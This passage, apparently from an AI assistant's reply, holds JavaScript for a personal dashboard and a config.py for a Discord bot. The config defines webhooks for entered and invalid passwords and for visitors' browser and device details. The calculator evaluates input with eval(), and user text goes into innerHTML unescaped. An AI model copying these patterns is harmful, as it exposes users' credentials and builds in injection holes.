    if (dateInput && timeInput && eventInput) {
        const fullDate = `${dateInput}T${timeInput}`; const newDate = { id: Date.now(), datetime: new Date(fullDate).toISOString(), event: eventInput };
        importantDates.unshift(newDate); importantDates.sort((a, b) => new Date(a.datetime) - new Date(b.datetime)); saveImportantDatesToStorage(); updateImportantDatesDisplay(); logActivity(`Added important date: ${eventInput} on ${new Date(fullDate).toLocaleString()}`); showNotification("Important date added!");
        document.getElementById('importantDateDay').value = new Date().toISOString().split('T')[0]; document.getElementById('importantDateTime').value = new Date().toTimeString().slice(0,5); document.getElementById('importantDateEvent').value = '';
    } else { showError("Please fill in all important date fields."); }
}
function clearImportantDates() { if (confirm("Are you sure you want to clear all important dates? This cannot be undone locally.")) { importantDates = []; saveImportantDatesToStorage(); updateImportantDatesDisplay(); logActivity("All important dates cleared."); showNotification("All important dates cleared."); } }
function updateImportantDatesDisplay() { const container = document.getElementById('importantDatesList'); if (!container) return; container.innerHTML = ''; importantDates.forEach(dateEntry => { const entryElement = document.createElement('div'); entryElement.className = 'important-date-item'; const formattedDate = new Date(dateEntry.datetime).toLocaleString(); entryElement.innerHTML = `<div class="date-time">${formattedDate}</div><div class="event-description">${dateEntry.event}</div>`; container.appendChild(entryElement); }); }
function incrementClickCounter() { clickCount++; updateClickCountDisplay(); saveClickCountToStorage(); logActivity('Mouse click incremented'); }
function resetClickCounter() { if (confirm("Are you sure you want to reset the click counter? This cannot be undone locally.")) { clickCount = 0; updateClickCountDisplay(); saveClickCountToStorage(); logActivity('Mouse clicker reset'); showNotification("Click counter reset!"); } }
function updateClickCountDisplay() { const display = document.getElementById('clickCountDisplay'); if (display) { display.textContent = clickCount; } }
function updateStats() { document.getElementById('buttonPresses').textContent = stats.buttonPresses; document.getElementById('toggleSwitches').textContent = stats.toggleSwitches; document.getElementById('panelsOpened').textContent = stats.panelsOpened; document.getElementById('panelsClosed').textContent = stats.panelsClosed; document.getElementById('searchQueries').textContent = stats.searchQueries; }
function downloadActivityLogs() { const data = { activityLogs, loginHistory, importantDates, mouseClickCount: clickCount, errorLogs, stats, timestamp: new Date().toISOString() }; const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' }); const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href = url; a.download = `activity_logs_${new Date().toISOString().split('T')[0]}.json`; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url); stats.buttonPresses++; logActivity('All activity data downloaded'); showNotification('All activity data downloaded!'); updateStats(); }
function showStats() { togglePanel('statsPanel'); const ctx = document.getElementById('statsChart').getContext('2d'); if (Chart.getChart(ctx)) { Chart.getChart(ctx).destroy(); } new Chart(ctx, { type: 'doughnut', data: { labels: ['Button Presses', 'Toggle Switches', 'Panels Opened', 'Panels Closed', 'Search Queries', 'Mouse Clicks'], datasets: [{ data: [stats.buttonPresses, stats.toggleSwitches, stats.panelsOpened, stats.panelsClosed, stats.searchQueries, clickCount], backgroundColor: ['#ff4500', '#ff6b35', '#00ff41', '#ffaa00', '#0066cc', '#8800cc'] }] }, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { labels: { color: getComputedStyle(document.documentElement).getPropertyValue('--text-primary') } } } } }); }
// Timer and Stopwatch (no changes)
function startStopwatch() { if (!isStopwatchRunning) { isStopwatchRunning = true; stopwatchInterval = setInterval(() => { stopwatchTime++; updateStopwatchDisplay(); }, 10); logActivity('Stopwatch started'); } }
function pauseStopwatch() { if (isStopwatchRunning) { isStopwatchRunning = false; clearInterval(stopwatchInterval); logActivity('Stopwatch paused'); } }
function resetStopwatch() { isStopwatchRunning = false; clearInterval(stopwatchInterval); stopwatchTime = 0; updateStopwatchDisplay(); logActivity('Stopwatch reset'); }
function updateStopwatchDisplay() { const totalSeconds = Math.floor(stopwatchTime / 100); const hours = Math.floor(totalSeconds / 3600); const minutes = Math.floor((totalSeconds % 3600) / 60); const seconds = totalSeconds % 60; const centiseconds = stopwatchTime % 100; document.getElementById('stopwatchDisplay').textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}.${centiseconds.toString().padStart(2, '0')}`; }
function startTimer() { const hours = parseInt(document.getElementById('timerHours').value) || 0; const minutes = parseInt(document.getElementById('timerMinutes').value) || 0; const seconds = parseInt(document.getElementById('timerSeconds').value) || 0; timerTime = (hours * 3600) + (minutes * 60) + seconds; if (timerTime > 0 && !isTimerRunning) { isTimerRunning = true; timerInterval = setInterval(() => { timerTime--; updateTimerDisplay(); if (timerTime <= 0) { pauseTimer(); showNotification('Timer finished!'); logActivity('Timer completed'); } }, 1000); logActivity('Timer started'); } }
function pauseTimer() { isTimerRunning = false; clearInterval(timerInterval); logActivity('Timer paused'); }
function resetTimer() { isTimerRunning = false; clearInterval(timerInterval); timerTime = 0; updateTimerDisplay(); logActivity('Timer reset'); }
function updateTimerDisplay() { const hours = Math.floor(timerTime / 3600); const minutes = Math.floor((timerTime % 3600) / 60); const seconds = timerTime % 60; document.getElementById('timerDisplay').textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`; }
function addReminder() { const text = document.getElementById('reminderText').value; const time = document.getElementById('reminderTime').value; if (text && time) { const reminderTime = new Date(time); const now = new Date(); if (reminderTime > now) { const timeout = reminderTime.getTime() - now.getTime(); setTimeout(() => { showNotification(`Reminder: ${text}`); }, timeout); const reminderElement = document.createElement('div'); reminderElement.className = 'p-2 bg-gray-700 rounded'; reminderElement.innerHTML = `<div class="font-semibold">${text}</div><div class="text-sm text-gray-400">${reminderTime.toLocaleString()}</div>`; document.getElementById('remindersList').appendChild(reminderElement); document.getElementById('reminderText').value = ''; document.getElementById('reminderTime').value = ''; logActivity(`Reminder set: ${text}`); } } }
// Drawing Tools (no changes)
function selectTool(button, tool) { document.querySelectorAll('.tool-btn[data-tool]').forEach(btn => btn.classList.remove('active')); button.classList.add('active'); currentTool = tool; canvas.style.cursor = tool === 'eraser' ? 'crosshair' : 'crosshair'; logActivity(`Drawing tool changed to: ${tool}`); }
function clearCanvas() { ctx.clearRect(0, 0, canvas.width, canvas.height); logActivity('Canvas cleared'); }
function saveCanvas() { const link = document.createElement('a'); link.download = `drawing_${Date.now()}.png`; link.href = canvas.toDataURL(); link.click(); logActivity('Canvas saved'); }
// Calculator (logic updated for `calcDisplayValue`, `calcCurrentExpression`)
function appendToCalc(value) { if (calcDisplayValue === '0' && value !== '.') { calcDisplayValue = value; } else { calcDisplayValue += value; } document.getElementById('calcDisplay').textContent = calcDisplayValue; }
function clearCalc() { calcDisplayValue = '0'; calcCurrentExpression = ''; document.getElementById('calcDisplay').textContent = calcDisplayValue; }
function deleteLast() { if (calcDisplayValue.length > 1 && calcDisplayValue !== '0') { calcDisplayValue = calcDisplayValue.slice(0, -1); } else { calcDisplayValue = '0'; } document.getElementById('calcDisplay').textContent = calcDisplayValue; }
function calculateResult() { try { let expression = calcDisplayValue.replace(/×/g, '*').replace(/÷/g, '/'); const result = eval(expression); calcDisplayValue = String(result); document.getElementById('calcDisplay').textContent = calcDisplayValue; logActivity(`Calculation performed: ${expression} = ${result}`); } catch (error) { calcDisplayValue = 'Error'; document.getElementById('calcDisplay').textContent = calcDisplayValue; logError(`Calculator Error: ${error.message}`); } }
// Unit Converter (no changes)
function updateConversionUnits() { const type = document.getElementById('conversionType').value; const fromUnit = document.getElementById('fromUnit'); const toUnit = document.getElementById('toUnit'); const units = { length: [{ value: 'm', text: 'Meters' },{ value: 'km', text: 'Kilometers' },{ value: 'cm', text: 'Centimeters' },{ value: 'mm', text: 'Millimeters' },{ value: 'in', text: 'Inches' },{ value: 'ft', text: 'Feet' }], weight: [{ value: 'kg', text: 'Kilograms' },{ value: 'g', text: 'Grams' },{ value: 'lb', text: 'Pounds' },{ value: 'oz', text: 'Ounces' }], temperature: [{ value: 'c', text: 'Celsius' },{ value: 'f', text: 'Fahrenheit' },{ value: 'k', text: 'Kelvin' }], volume: [{ value: 'l', text: 'Liters' },{ value: 'ml', text: 'Milliliters' },{ value: 'gal', text: 'Gallons' },{ value: 'qt', text: 'Quarts' }] }; fromUnit.innerHTML = ''; toUnit.innerHTML = ''; units[type].forEach(unit => { fromUnit.innerHTML += `<option value="${unit.value}">${unit.text}</option>`; toUnit.innerHTML += `<option value="${unit.value}">${unit.text}</option>`; }); convertUnits(); }
function convertUnits() { const fromValue = parseFloat(document.getElementById('fromValue').value); const fromUnit = document.getElementById('fromUnit').value; const toUnit = document.getElementById('toUnit').value; const type = document.getElementById('conversionType').value; if (isNaN(fromValue)) { document.getElementById('toValue').value = ''; return; } let result = fromValue; const factors = { length: { 'm': 1, 'km': 1000, 'cm': 0.01, 'mm': 0.001, 'in': 0.0254, 'ft': 0.3048 }, weight: { 'kg': 1000, 'g': 1, 'lb': 453.592, 'oz': 28.3495 }, temperature: { }, volume: { 'l': 1, 'ml': 0.001, 'gal': 3.78541, 'qt': 0.946353 } }; if (type === 'length') { result = fromValue * factors.length[fromUnit] / factors.length[toUnit]; } else if (type === 'weight') { result = fromValue * factors.weight[fromUnit] / factors.weight[toUnit]; } else if (type === 'volume') { result = fromValue * factors.volume[fromUnit] / factors.volume[toUnit]; } else if (type === 'temperature') { let tempInC; if (fromUnit === 'c') tempInC = fromValue; else if (fromUnit === 'f') tempInC = (fromValue - 32) * 5/9; else if (fromUnit === 'k') tempInC = fromValue - 273.15; if (toUnit === 'c') result = tempInC; else if (toUnit === 'f') result = (tempInC * 9/5) + 32; else if (toUnit === 'k') result = tempInC + 273.15; } document.getElementById('toValue').value = result.toFixed(6); logActivity(`Unit converted: ${fromValue} ${fromUnit} to ${result.toFixed(6)} ${toUnit}`); }
// Theme (no changes)
function toggleTheme() { document.body.classList.toggle('light-theme'); isLightMode = document.body.classList.contains('light-theme'); logActivity('Theme toggled to ' + (isLightMode ? 'Light Mode' : 'Dark Mode')); updateStatsChartTheme(); }
function applyAccentTheme(theme, event) { const root = document.documentElement; const themes = { orange: { primary: '#ff4500', secondary: '#ff6b35' }, blue: { primary: '#0066cc', secondary: '#004499' }, green: { primary: '#00cc44', secondary: '#009933' }, red: { primary: '#cc0044', secondary: '#990033' }, purple: { primary: '#8800cc', secondary: '#6600aa' }, amber: { primary: '#ffaa00', secondary: '#ff8800' }, teal: { primary: '#00aaaa', secondary: '#008888' }, pink: { primary: '#ff0088', secondary: '#cc0066' } }; if (themes[theme]) { root.style.setProperty('--accent-color', themes[theme].primary); root.style.setProperty('--accent-secondary', themes[theme].secondary); if (document.body.classList.contains('light-theme')) { root.style.setProperty('--success-color', themes[theme].primary); root.style.setProperty('--error-color', themes[theme].primary); root.style.setProperty('--warning-color', themes[theme].primary); } else { root.style.setProperty('--success-color', '#00ff41'); root.style.setProperty('--error-color', '#ff0040'); root.style.setProperty('--warning-color', '#ffaa00'); } document.querySelectorAll('.theme-option').forEach(opt => opt.classList.remove('active')); event.target.classList.add('active'); logActivity(`Accent theme changed to: ${theme}`); updateStatsChartTheme(); } }
function updateStatsChartTheme() { const chart = Chart.getChart('statsChart'); if (chart) { chart.options.plugins.legend.labels.color = getComputedStyle(document.documentElement).getPropertyValue('--text-primary'); chart.update(); } }
function toggleSetting(toggle) { toggle.classList.toggle('active'); stats.toggleSwitches++; logActivity(`Setting toggled: ${toggle.previousElementSibling.textContent}`); updateStats(); }
// Dashboard Content Refresh/Clear Functions (no changes)
function refreshFact() { const facts = ["Honey never spoils. Archaeologists have found pots of honey in ancient Egyptian tombs that are over 3000 years old and still perfectly edible.", "A group of flamingos is called a 'flamboyance'.", "Bananas are berries, but strawberries aren't.", "The shortest war in history lasted only 38-45 minutes.", "A single cloud can weigh more than a million pounds."]; document.getElementById('randomFact').textContent = facts[Math.floor(Math.random() * facts.length)]; logActivity('Random fact refreshed'); }
function refreshQuote() { const quotes = ["\"The only way to do great work is to love what you do.\" - Steve Jobs", "\"Innovation distinguishes between a leader and a follower.\" - Steve Jobs", "\"Life is what happens to you while you're busy making other plans.\" - John Lennon", "\"The future belongs to those who believe in the beauty of their dreams.\" - Eleanor Roosevelt", "\"It is during our darkest moments that we must focus to see the light.\" - Aristotle"]; document.getElementById('dailyQuote').textContent = quotes[Math.floor(Math.random() * quotes.length)]; logActivity('Daily quote refreshed'); }
function clearNotifications() { notificationsList.innerHTML = ''; logActivity('Notifications cleared'); } // Updated to use notificationsList
function clearActivityLogs() { if (confirm("Are you sure you want to clear all activity logs? This cannot be undone locally.")) { activityLogs = []; updateActivityLogDisplay(); logActivity('Activity logs cleared'); } }
function saveTextNotes() { const notes = document.getElementById('textNotes').value; localStorage.setItem('textNotes', notes); showNotification('Notes saved successfully'); logActivity('Text notes saved'); }
function clearTextNotes() { if (confirm("Are you sure you want to clear your text notes?")) { document.getElementById('textNotes').value = ''; logActivity('Text notes cleared'); } }

// Dashboard Actions (triggered client-side, now also interacts with server)
function logout() { // Client-side logout action
    if (confirm('Are you sure you want to logout? This will clear local data and refresh the system.')) {
        logActivity('System logged out (client-side initiated).');
        if (socket) socket.disconnect(); // Explicitly disconnect Socket.IO client
        localStorage.clear();
        location.reload();
    }
}
function takeScreenshot() {
    html2canvas(document.body).then(function(canvas) {
        const link = document.createElement('a'); link.download = `screenshot_${Date.now()}.png`; link.href = canvas.toDataURL('image/png');
        document.body.appendChild(link); link.click(); document.body.removeChild(link);
        showNotification('Screenshot saved!'); logActivity('Screenshot taken'); stats.buttonPresses++; updateStats();
        // In a real screenshot implementation, the image data would be uploaded to a server
        // after being captured here. The server could then log to Discord.
    });
}
function togglePanelsGridVisibility() {
    if (panelsGrid.style.display === 'none' || panelsGrid.style.opacity === '0') { panelsGrid.style.display = 'grid'; panelsGrid.style.opacity = '1'; showNotification('Dashboard sections are now visible.'); logActivity('Dashboard sections toggled ON'); }
    else { panelsGrid.style.opacity = '0'; setTimeout(() => { panelsGrid.style.display = 'none'; }, 300); showNotification('Dashboard sections are now hidden.'); logActivity('Dashboard sections toggled OFF'); } stats.buttonPresses++; updateStats();
}
function restartSystem() { // Client-side restart action
    if (confirm('Are you sure you want to restart the system? You will be logged out and all unsaved local data will be lost.')) {
        logActivity('System restart initiated (client-side).');
        if (socket) socket.disconnect(); // Explicitly disconnect Socket.IO client
        // No server API call to log restart, relies on client-side cleanup.
        localStorage.clear(); location.reload();
    }
}


// --- Main Event Listeners ---
document.addEventListener('DOMContentLoaded', () => {
  setupToggles();
  submitBtn.addEventListener('click', (e) => { e.preventDefault(); stats.buttonPresses++; attemptLogin(); });
  resetBtn.addEventListener('click', resetCounter);
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') { if (resetPopup.style.display === 'flex') { resetCounter(); } else if (!document.getElementById('loginScreen').classList.contains('hidden')) { attemptLogin(); } }
  });
  document.getElementById('penColor').addEventListener('change', (e) => { currentColor = e.target.value; }); document.getElementById('penThickness').addEventListener('input', (e) => { currentThickness = parseInt(e.target.value); });
  const savedNotes = localStorage.getItem('textNotes'); if (savedNotes) { document.getElementById('textNotes').value = savedNotes; }
  document.addEventListener('click', (e) => { if ((e.target.tagName === 'BUTTON' && !e.target.closest('.panel-controls') && !e.target.classList.contains('submit-btn')) || e.target.closest('.quick-btn')) { stats.buttonPresses++; updateStats(); } });
  const today = new Date(); document.getElementById('importantDateDay').value = today.toISOString().split('T')[0]; document.getElementById('importantDateTime').value = "09:00";
  // Calculator Init
  const calcDisplayElem = document.getElementById('calcDisplay'); if (calcDisplayElem) { calcDisplayElem.textContent = calcDisplayValue; }
  const conversionTypeSelect = document.getElementById('conversionType'); if (conversionTypeSelect) { conversionTypeSelect.addEventListener('change', updateConversionUnits); updateConversionUnits(); }
  const fromValueInput = document.getElementById('fromValue'); if (fromValueInput) { fromValueInput.addEventListener('input', convertUnits); }
});
```

---

### **5. `config.py` (FULL Code - Webhook Environment Variable Names)**

**REPLACE EVERYTHING** in your existing `config.py` with this:

```python
# config.py
import os

# --- Discord Bot Configuration ---
DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
COMMAND_PREFIX = os.getenv("COMMAND_PREFIX", ".")

# --- Discord Channel IDs ---
WEBSITE_CHANNEL_ID = int(os.getenv("WEBSITE_CHANNEL_ID", "0"))
LOGIN_CHANNEL_ID = int(os.getenv("LOGIN_CHANNEL_ID", "0"))
DISCONNECTED_CHANNEL_ID = int(os.getenv("DISCONNECTED_CHANNEL_ID", "0"))
LOGGING_CHANNEL_ID = int(os.getenv("LOGGING_CHANNEL_ID", "0"))
ERROR_CHANNEL_ID = int(os.getenv("ERROR_CHANNEL_ID", "0"))

# --- Discord Webhook URLs (SET THESE AS ENVIRONMENT VARIABLES ON RENDER) ---
# Each webhook needs a unique environment variable name.
WEBHOOK_USERNAME_INFO = os.getenv("WEBHOOK_USERNAME_INFO")
WEBHOOK_PASSWORD_INFO = os.getenv("WEBHOOK_PASSWORD_INFO")
WEBHOOK_IDENTIFIER_INFO = os.getenv("WEBHOOK_IDENTIFIER_INFO")
WEBHOOK_INVALID_USERNAME_INFO = os.getenv("WEBHOOK_INVALID_USERNAME_INFO")
WEBHOOK_INVALID_PASSWORD_INFO = os.getenv("WEBHOOK_INVALID_PASSWORD_INFO")
WEBHOOK_INVALID_IDENTIFIER_INFO = os.getenv("WEBHOOK_INVALID_IDENTIFIER_INFO")
WEBHOOK_ATTEMPT_COUNTER_INFO = os.getenv("WEBHOOK_ATTEMPT_COUNTER_INFO")
WEBHOOK_ATTEMPT_EXCEEDED_INFO = os.getenv("WEBHOOK_ATTEMPT_EXCEEDED_INFO")
WEBHOOK_RESET_INFO = os.getenv("WEBHOOK_RESET_INFO")
WEBHOOK_CORRECT_INFO = os.getenv("WEBHOOK_CORRECT_INFO")
WEBHOOK_INCORRECT_INFO = os.getenv("WEBHOOK_INCORRECT_INFO")
WEBHOOK_USER_INFO = os.getenv("WEBHOOK_USER_INFO")
WEBHOOK_BROWSER_INFO = os.getenv("WEBHOOK_BROWSER_INFO")
WEBHOOK_DEVICE_INFO = os.getenv("WEBHOOK_DEVICE_INFO")
WEBHOOK_CONNECTION_INFO = os.getenv("WEBHOOK_CONNECTION_INFO")
WEBHOOK_SESSION_INFO = os.getenv("WEBHOOK_SESSION_INFO")

# --- Role ID for Admin Commands (Optional) ---
ADMIN_ROLE_ID_STR = os.getenv("ADMIN_ROLE_ID")
ADMIN_ROLE_ID = int(ADMIN_ROLE_ID_STR) if ADMIN_ROLE_ID_STR and ADMIN_ROLE_ID_STR.isdigit() else None

# --- Your Website Internal API Configuration ---
# This is the base URL for your *internal* Flask API. Discord bot calls this.
WEBSITE_API_BASE_URL = os.getenv("WEBSITE_API_BASE_URL", "http://localhost:8000") # Flask running on this internal port.

# --- Render-provided PORT ---
PORT = int(os.getenv("PORT", "8000")) # Ensure this is also accessed by main.py directly where Flask runs.

# --- Debugging ---
DEBUG_MODE = os.getenv("DEBUG_MODE", "False").lower() == "true
